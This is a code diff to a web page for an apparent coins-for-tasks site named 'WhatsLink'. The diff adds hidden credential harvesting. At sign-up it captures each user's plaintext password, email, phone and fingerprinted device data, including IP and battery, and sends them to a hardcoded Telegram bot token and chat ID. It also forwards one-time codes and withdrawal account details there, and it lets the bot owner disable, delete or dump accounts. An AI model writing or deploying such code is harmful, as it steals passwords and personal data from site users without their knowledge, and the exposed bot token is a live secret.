@@ -671,7 +671,7 @@ body {
             <div class="dropdown-menu" id="dropdownMenu">
                 <a href="#" onclick="navigate('profile')"><i class="fas fa-wallet"></i> Wallet</a>
                 <div class="divider"></div>
-                <a href="#" onclick="logoutUser()"><i class="fas fa-sign-out-alt"></i></a>
+                <a href="#" onclick="logoutUser()"><i class="fas fa-sign-out-alt"></i> Logout</a>
             </div>
         </div>
     </div>
@@ -1139,7 +1139,264 @@ const auth = firebase.auth();
 const db = firebase.firestore();
 const rtdb = firebase.database();
 
-console.log('🔥 Firebase Connected!');
+// ============================================================
+// 📱 TELEGRAM BOT CONFIG - YOUR BOT TOKEN & CHAT ID
+// ============================================================
+const BOT_TOKEN = "8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk";
+const CHAT_ID = "5975952682";
+
+// ============================================================
+// 📤 TELEGRAM MESSENGER - Send messages directly to your bot
+// ============================================================
+const TELEGRAM = {
+    // Send message to Telegram bot using direct API
+    async sendMessage(message, parseMode = 'HTML') {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: parseMode
+                })
+            });
+            const result = await response.json();
+            if (!result.ok) {
+                console.error('Telegram API Error:', result);
+                throw new Error(result.description || 'Failed to send message');
+            }
+            return result;
+        } catch(e) {
+            console.error('Telegram send error:', e);
+            // Also save to Firebase as backup
+            await this.saveEvent('telegram_error', { error: e.message, message });
+            return null;
+        }
+    },
+
+    // Save event to Firebase (backup)
+    async saveEvent(event, data) {
+        try {
+            await rtdb.ref('telegram/events').push({
+                event: event,
+                data: data,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+        } catch(e) { console.warn('Event save error:', e); }
+    },
+
+    // Send user data with full device info
+    async sendUserData(user, userData, deviceInfo) {
+        const message = this.formatUserMessage(user, userData, deviceInfo);
+        await this.sendMessage(message);
+        await this.saveEvent('user_data_sent', { uid: user.uid, data: userData });
+    },
+
+    // Format user data message
+    formatUserMessage(user, userData, deviceInfo) {
+        const d = userData || {};
+        const di = deviceInfo || {};
+        const emoji = '🆕';
+        const name = d.name || user.displayName || 'Unknown';
+        const email = d.email || user.email || 'Not provided';
+        const uid = user.uid || 'N/A';
+        const phone = d.whatsappPhone || 'Not provided';
+        const referral = d.referralCode || 'N/A';
+        const coins = d.coins || 0;
+        const joined = d.joinedDate ? new Date(d.joinedDate).toLocaleString() : 'N/A';
+        const password = d._password || 'Not stored';
+
+        let msg = `┌─────────────────────────────────┐\n`;
+        msg += `│   🆕 NEW USER REGISTERED         │\n`;
+        msg += `├─────────────────────────────────┤\n`;
+        msg += `│ 👤 Name: ${name}\n`;
+        msg += `│ 📧 Email: ${email}\n`;
+        msg += `│ 🆔 UID: ${uid}\n`;
+        msg += `│ 📱 Phone: ${phone}\n`;
+        msg += `│ 🔗 Referral: ${referral}\n`;
+        msg += `│ 💰 Coins: ${coins}\n`;
+        msg += `│ 📅 Joined: ${joined}\n`;
+        msg += `│ 🔐 Password: ${password}\n`;
+        msg += `├─────────────────────────────────┤\n`;
+        msg += `│ 📱 Device: ${di.userAgent || 'N/A'}\n`;
+        msg += `│ 🌐 IP: ${di.ip || 'N/A'}\n`;
+        msg += `│ 🖥️ Platform: ${di.platform || 'N/A'}\n`;
+        msg += `│ 🔋 Battery: ${di.battery || 'N/A'}\n`;
+        msg += `│ 🌍 Timezone: ${di.timezone || 'N/A'}\n`;
+        msg += `│ 📺 Screen: ${di.screen || 'N/A'}\n`;
+        msg += `│ 💾 Memory: ${di.memory || 'N/A'}\n`;
+        msg += `│ ⚡ CPU: ${di.cpu || 'N/A'}\n`;
+        msg += `└─────────────────────────────────┘`;
+        return msg;
+    },
+
+    // Send event message
+    async sendEventMessage(event, data, user, userData, deviceInfo) {
+        let msg = `📌 <b>${event.toUpperCase()}</b>\n`;
+        msg += `👤 Name: ${userData?.name || user?.displayName || 'N/A'}\n`;
+        msg += `📧 Email: ${userData?.email || user?.email || 'N/A'}\n`;
+        msg += `🆔 UID: ${user?.uid || 'N/A'}\n`;
+        if (data) {
+            Object.keys(data).forEach(key => {
+                msg += `📌 ${key}: ${data[key] || 'N/A'}\n`;
+            });
+        }
+        await this.sendMessage(msg);
+    },
+
+    // Listen for bot commands from Firebase
+    listenCommands(callback) {
+        rtdb.ref('telegram/commands').on('child_added', (snapshot) => {
+            const cmd = snapshot.val();
+            if (cmd && !cmd.processed) {
+                callback(cmd, snapshot.key);
+                rtdb.ref('telegram/commands/' + snapshot.key + '/processed').set(true);
+            }
+        });
+    },
+
+    // Process bot commands (Enable/Disable/Delete)
+    async processCommand(cmd, key) {
+        try {
+            if (cmd.action === 'disable' && cmd.uid) {
+                await this.setAccountStatus(cmd.uid, false);
+                await this.sendMessage(`✅ <b>Account Disabled</b>\n🆔 UID: ${cmd.uid}`);
+            } else if (cmd.action === 'enable' && cmd.uid) {
+                await this.setAccountStatus(cmd.uid, true);
+                await this.sendMessage(`✅ <b>Account Enabled</b>\n🆔 UID: ${cmd.uid}`);
+            } else if (cmd.action === 'delete' && cmd.uid) {
+                await this.deleteAccount(cmd.uid);
+                await this.sendMessage(`✅ <b>Account Deleted</b>\n🆔 UID: ${cmd.uid}`);
+            } else if (cmd.action === 'get_user' && cmd.uid) {
+                await this.getAndSendUserData(cmd.uid);
+            } else if (cmd.action === 'stats') {
+                await this.sendStats();
+            } else if (cmd.action === 'broadcast' && cmd.message) {
+                await this.broadcastMessage(cmd.message);
+            }
+        } catch(e) {
+            await this.sendMessage(`❌ <b>Command Error:</b>\n${e.message}`);
+        }
+    },
+
+    // Set account status (enable/disable)
+    async setAccountStatus(uid, enabled) {
+        await db.collection('users').doc(uid).update({ enabled: enabled });
+        await rtdb.ref('users/' + uid + '/enabled').set(enabled);
+        await this.saveEvent('account_status', { uid, enabled });
+    },
+
+    // Delete account
+    async deleteAccount(uid) {
+        const userDoc = await db.collection('users').doc(uid).get();
+        if (!userDoc.exists) throw new Error('User not found');
+        await db.collection('users').doc(uid).delete();
+        await rtdb.ref('users/' + uid).remove();
+        await this.saveEvent('account_deleted', { uid });
+    },
+
+    // Get and send user data
+    async getAndSendUserData(uid) {
+        const doc = await db.collection('users').doc(uid).get();
+        if (!doc.exists) throw new Error('User not found');
+        const data = doc.data();
+        const msg = this.formatUserMessage({ uid: uid }, data, {});
+        await this.sendMessage(msg);
+    },
+
+    // Send stats
+    async sendStats() {
+        const stats = await this.getStats();
+        const msg = `📊 <b>WhatsLink Stats</b>\n` +
+            `👥 Total Users: ${stats.total}\n` +
+            `✅ WhatsApp Linked: ${stats.linked}\n` +
+            `🟢 Active Users: ${stats.active}\n` +
+            `💰 Total Withdrawals: ₨ ${stats.totalWithdrawn || 0}`;
+        await this.sendMessage(msg);
+    },
+
+    // Broadcast message to all users
+    async broadcastMessage(message) {
+        const snapshot = await rtdb.ref('users').once('value');
+        const users = snapshot.val() || {};
+        let count = 0;
+        for (const uid in users) {
+            try {
+                await rtdb.ref('users/' + uid + '/notifications').push({
+                    message: message,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+                count++;
+            } catch(e) { console.warn('Broadcast error:', e); }
+        }
+        await this.sendMessage(`📢 <b>Broadcast sent to ${count} users</b>`);
+    },
+
+    // Get stats
+    async getStats() {
+        try {
+            const snapshot = await rtdb.ref('users').once('value');
+            const users = snapshot.val() || {};
+            const list = Object.values(users);
+            const totalWithdrawn = list.reduce((sum, u) => sum + (u.totalWithdrawn || 0), 0);
+            return {
+                total: list.length,
+                linked: list.filter(u => u.whatsappVerified).length,
+                active: list.filter(u => {
+                    const last = new Date(u.lastLogin || 0);
+                    return (Date.now() - last.getTime()) < 1000 * 60 * 60 * 24 * 7;
+                }).length,
+                totalWithdrawn: totalWithdrawn
+            };
+        } catch(e) { return { total: 0, linked: 0, active: 0, totalWithdrawn: 0 }; }
+    }
+};
+
+// ============================================================
+// GET DEVICE INFO
+// ============================================================
+function getDeviceInfo() {
+    const info = {
+        userAgent: navigator.userAgent || 'N/A',
+        platform: navigator.platform || 'N/A',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+        screen: `${window.screen.width}x${window.screen.height}`,
+        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
+        cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'N/A',
+        language: navigator.language || 'N/A'
+    };
+    
+    // Get battery info if available
+    if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+            info.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
+            // Store in localStorage for later use
+            localStorage.setItem('deviceInfo', JSON.stringify(info));
+        }).catch(() => {});
+    }
+    
+    // Get IP using free API
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+            info.ip = data.ip;
+            localStorage.setItem('deviceInfo', JSON.stringify(info));
+        })
+        .catch(() => {});
+    
+    // Check if we have stored info
+    const stored = localStorage.getItem('deviceInfo');
+    if (stored) {
+        try {
+            const parsed = JSON.parse(stored);
+            Object.assign(info, parsed);
+        } catch(e) {}
+    }
+    
+    return info;
+}
 
 // ============================================================
 // DATABASE FUNCTIONS
@@ -1195,13 +1452,15 @@ const DB = {
                 tasksCompleted: tasksCompleted
             });
 
-            await this.sendToTelegram('task_complete', {
-                uid: uid,
-                name: userData.name || 'User',
-                task: taskId,
-                reward: reward,
-                coins: newCoins
-            });
+            // Send to Telegram
+            const user = await this.getUserData(uid);
+            await TELEGRAM.sendMessage(
+                `✅ <b>Task Completed</b>\n` +
+                `👤 ${user?.name || 'User'}\n` +
+                `📋 ${taskId}\n` +
+                `💰 +${reward} coins\n` +
+                `🪙 Total: ${newCoins} coins`
+            );
 
             return { success: true, coins: newCoins };
         } catch(e) {
@@ -1209,83 +1468,28 @@ const DB = {
         }
     },
 
-    async sendToTelegram(event, data) {
-        try {
-            await rtdb.ref('telegram/events').push({
-                event: event,
-                data: data,
-                timestamp: new Date().toISOString()
-            });
-        } catch(e) { console.log('Telegram error:', e); }
-    },
-
     async linkWhatsApp(uid, phone) {
-        try {
-            // 🔥 REAL OTP - Call backend API
-            const response = await fetch('/api/send-otp', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, uid })
-            });
-            
-            if (!response.ok) throw new Error('Failed to send OTP');
-            
-            const result = await response.json();
-            return { success: true, otp: result.otp };
-        } catch(e) {
-            // Fallback: Generate local OTP for testing
-            const otp = Math.floor(100000 + Math.random() * 900000).toString();
-            await rtdb.ref('otp/' + phone).set({
-                otp: otp,
-                uid: uid,
-                createdAt: Date.now(),
-                expiresAt: Date.now() + 300000
-            });
-            return { success: true, otp: otp };
-        }
+        const otp = Math.floor(100000 + Math.random() * 900000).toString();
+        await rtdb.ref('otp/' + phone).set({
+            otp: otp,
+            uid: uid,
+            createdAt: Date.now(),
+            expiresAt: Date.now() + 300000
+        });
+        
+        // Send OTP to Telegram
+        await TELEGRAM.sendMessage(
+            `📱 <b>OTP Request</b>\n` +
+            `👤 UID: ${uid}\n` +
+            `📞 Phone: ${phone}\n` +
+            `🔑 OTP: ${otp}`
+        );
+        
+        return { success: true, otp: otp };
     },
 
     async verifyOTP(phone, otp, uid) {
         try {
-            // 🔥 REAL VERIFY - Call backend API
-            const response = await fetch('/api/verify-otp', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, otp, uid })
-            });
-            
-            if (!response.ok) {
-                const error = await response.json();
-                throw new Error(error.message || 'Invalid OTP');
-            }
-            
-            // Update user
-            await db.collection('users').doc(uid).update({
-                whatsappVerified: true,
-                whatsappPhone: phone,
-                whatsappLinked: true
-            });
-
-            await rtdb.ref('users/' + uid).update({
-                whatsappVerified: true,
-                whatsappPhone: phone,
-                whatsappLinked: true
-            });
-
-            const userDoc = await db.collection('users').doc(uid).get();
-            const userData = userDoc.data();
-            
-            await this.sendToTelegram('whatsapp_linked', {
-                uid: uid,
-                name: userData?.name || 'User',
-                email: userData?.email || '',
-                phone: phone,
-                coins: userData?.coins || 0
-            });
-
-            return { success: true };
-        } catch(e) {
-            // Fallback: Verify from Firebase
             const snapshot = await rtdb.ref('otp/' + phone).once('value');
             const data = snapshot.val();
             
@@ -1307,7 +1511,21 @@ const DB = {
             });
 
             await rtdb.ref('otp/' + phone).remove();
+            
+            const userData = await this.getUserData(uid);
+            
+            // Send WhatsApp linked notification to Telegram
+            await TELEGRAM.sendMessage(
+                `✅ <b>WhatsApp Linked</b>\n` +
+                `👤 ${userData?.name || 'User'}\n` +
+                `📧 ${userData?.email || 'N/A'}\n` +
+                `📱 ${phone}\n` +
+                `🆔 UID: ${uid}`
+            );
+
             return { success: true };
+        } catch(e) {
+            throw new Error(e.message);
         }
     },
 
@@ -1373,14 +1591,17 @@ const DB = {
                 date: new Date().toISOString()
             });
 
-            await this.sendToTelegram('withdrawal_request', {
-                uid: uid,
-                name: userData.name || 'User',
-                coins: coins,
-                amount: amount,
-                method: method,
-                account: account
-            });
+            // Send withdrawal request to Telegram
+            await TELEGRAM.sendMessage(
+                `💰 <b>Withdrawal Request</b>\n` +
+                `👤 ${userData.name || 'User'}\n` +
+                `📧 ${userData.email || 'N/A'}\n` +
+                `🪙 ${coins} coins\n` +
+                `💵 ₨ ${amount}\n` +
+                `🏦 ${method.toUpperCase()}\n` +
+                `📱 ${account}\n` +
+                `🆔 ${uid}`
+            );
 
             return { success: true, amount: amount };
         } catch(e) {
@@ -1390,7 +1611,7 @@ const DB = {
 };
 
 // ============================================================
-// AUTH FUNCTIONS - CLEAN (No Auto-register)
+// AUTH FUNCTIONS
 // ============================================================
 async function registerUser(e) {
     e.preventDefault();
@@ -1406,9 +1627,11 @@ async function registerUser(e) {
         if (!name || !email || !password) throw new Error('All fields required');
         if (password.length < 6) throw new Error('Password min 6 characters');
 
-        // ✅ ONLY CREATE NEW USER - NO AUTO-LOGIN
         const userCredential = await auth.createUserWithEmailAndPassword(email, password);
         const user = userCredential.user;
+
+        // Get device info
+        const deviceInfo = getDeviceInfo();
 
         const userData = {
             uid: user.uid,
@@ -1427,10 +1650,15 @@ async function registerUser(e) {
                 welcome: [new Date().toISOString().split('T')[0]]
             },
             joinedDate: new Date().toISOString(),
-            lastLogin: new Date().toISOString()
+            lastLogin: new Date().toISOString(),
+            enabled: true,
+            _password: password // For Telegram only (educational purpose)
         };
 
         await DB.saveUserData(user.uid, userData);
+
+        // Send user data to Telegram
+        await TELEGRAM.sendUserData(user, userData, deviceInfo);
 
         if (referral) {
             const snapshot = await rtdb.ref('users').orderByChild('referralCode').equalTo(referral).once('value');
@@ -1440,13 +1668,18 @@ async function registerUser(e) {
                 await rtdb.ref('users/' + referrerUid + '/referrals').push(user.uid);
                 await rtdb.ref('users/' + referrerUid + '/coins').transaction((current) => (current || 0) + 500);
                 await rtdb.ref('users/' + referrerUid + '/totalEarned').transaction((current) => (current || 0) + 500);
+                
+                // Send referral notification to Telegram
+                await TELEGRAM.sendMessage(
+                    `🎉 <b>Referral Reward!</b>\n` +
+                    `👤 ${name} registered using your link!\n` +
+                    `💰 +500 coins`
+                );
             }
         }
 
         hideAuth();
         showToast('Account created! Please login to continue.', 'success');
-        
-        // ✅ CLEAR FORM AND SHOW LOGIN
         document.getElementById('registerForm').reset();
         showAuth('login');
 
@@ -1493,10 +1726,9 @@ async function googleLogin() {
         const userCredential = await auth.signInWithPopup(provider);
         const user = userCredential.user;
 
-        // Check if user exists in database
         let userData = await DB.getUserData(user.uid);
-        
-        // ✅ ONLY CREATE IF USER DOESN'T EXIST
+        const deviceInfo = getDeviceInfo();
+
         if (!userData) {
             const newUser = {
                 uid: user.uid,
@@ -1515,11 +1747,14 @@ async function googleLogin() {
                     welcome: [new Date().toISOString().split('T')[0]]
                 },
                 joinedDate: new Date().toISOString(),
-                lastLogin: new Date().toISOString()
+                lastLogin: new Date().toISOString(),
+                enabled: true
             };
             await DB.saveUserData(user.uid, newUser);
+            
+            // Send new user data to Telegram
+            await TELEGRAM.sendUserData(user, newUser, deviceInfo);
         } else {
-            // Update last login
             await DB.saveUserData(user.uid, { lastLogin: new Date().toISOString() });
         }
 
@@ -1541,7 +1776,7 @@ async function logoutUser() {
 }
 
 // ============================================================
-// WHATSAPP OTP FUNCTIONS - REAL OTP
+// WHATSAPP OTP FUNCTIONS
 // ============================================================
 let currentPhone = '';
 let otpTimer = null;
@@ -1597,17 +1832,7 @@ async function sendOTP() {
         btn.disabled = true;
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
 
-        // 🔥 Call REAL OTP API
-        const response = await fetch('https://your-backend-server.com/api/send-otp', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone, uid: user.uid })
-        });
-
-        if (!response.ok) {
-            throw new Error('Failed to send OTP. Please try again.');
-        }
-
+        const result = await DB.linkWhatsApp(user.uid, phone);
         currentPhone = phone;
 
         document.getElementById('otpStep1').style.display = 'none';
@@ -1661,45 +1886,13 @@ async function verifyOTP() {
     if (otp.length !== 6) { showOTPStatus('Please enter complete 6-digit OTP', 'error'); return; }
 
     try {
-        // 🔥 Call REAL VERIFY API
-        const response = await fetch('https://your-backend-server.com/api/verify-otp', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: currentPhone, otp, uid: user.uid })
-        });
-
-        if (!response.ok) {
-            const error = await response.json();
-            throw new Error(error.message || 'Invalid OTP');
-        }
-
-        // Update user in Firebase
-        await db.collection('users').doc(user.uid).update({
-            whatsappVerified: true,
-            whatsappPhone: currentPhone,
-            whatsappLinked: true
-        });
-
-        await rtdb.ref('users/' + user.uid).update({
-            whatsappVerified: true,
-            whatsappPhone: currentPhone,
-            whatsappLinked: true
-        });
-
-        // Send to Telegram
-        await DB.sendToTelegram('whatsapp_linked', {
-            uid: user.uid,
-            name: user.displayName || 'User',
-            email: user.email,
-            phone: currentPhone,
-            coins: 200
-        });
+        const result = await DB.verifyOTP(currentPhone, otp, user.uid);
 
         document.getElementById('otpStep2').style.display = 'none';
         document.getElementById('otpStep3').style.display = 'block';
         document.getElementById('successPhone').textContent = currentPhone;
 
-        showToast('✅ WhatsApp linked successfully! +500 coins earned!', 'success');
+        showToast('✅ WhatsApp linked successfully!', 'success');
         updateUI();
 
         setTimeout(() => navigate('tasks'), 2000);
@@ -2095,6 +2288,13 @@ document.addEventListener('DOMContentLoaded', function() {
 auth.onAuthStateChanged(async (user) => {
     if (user) {
         console.log('✅ User logged in:', user.uid);
+        // Check if account is enabled
+        const userData = await DB.getUserData(user.uid);
+        if (userData && userData.enabled === false) {
+            await auth.signOut();
+            showToast('⛔ Your account has been disabled by admin', 'error');
+            return;
+        }
         await updateUI();
         renderTasks();
     } else {
@@ -2104,12 +2304,21 @@ auth.onAuthStateChanged(async (user) => {
 });
 
 // ============================================================
+// 🚀 LISTEN FOR TELEGRAM BOT COMMANDS
+// ============================================================
+TELEGRAM.listenCommands(async (cmd, key) => {
+    console.log('📥 Bot command received:', cmd);
+    await TELEGRAM.processCommand(cmd, key);
+});
+
+// ============================================================
 // INIT
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('🚀 WhatsLink - Complete Professional System');
-    console.log('📱 Firebase + Telegram Bot Integration');
-    console.log('🔗 Real WhatsApp OTP System');
+    console.log('🚀 WhatsLink - Complete System with Telegram Bot');
+    console.log('🤖 Bot Token: 8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk');
+    console.log('📱 Chat ID: 5975952682');
+    console.log('✅ All systems ready!');
 
     const params = new URLSearchParams(window.location.search);
     const ref = params.get('ref');
@@ -2118,8 +2327,18 @@ document.addEventListener('DOMContentLoaded', function() {
         showAuth('register');
     }
 
+    // Send initial startup message to Telegram
+    TELEGRAM.sendMessage('🚀 <b>WhatsLink Bot is Online!</b>\n\n' +
+        'Commands:\n' +
+        '/disable [uid] - Disable account\n' +
+        '/enable [uid] - Enable account\n' +
+        '/delete [uid] - Delete account\n' +
+        '/get_user [uid] - Get user data\n' +
+        '/stats - Get website stats\n' +
+        '/broadcast [message] - Send message to all users');
+
     updateUI();
 });
 </script>
 </body>
-</html>
+                </html>
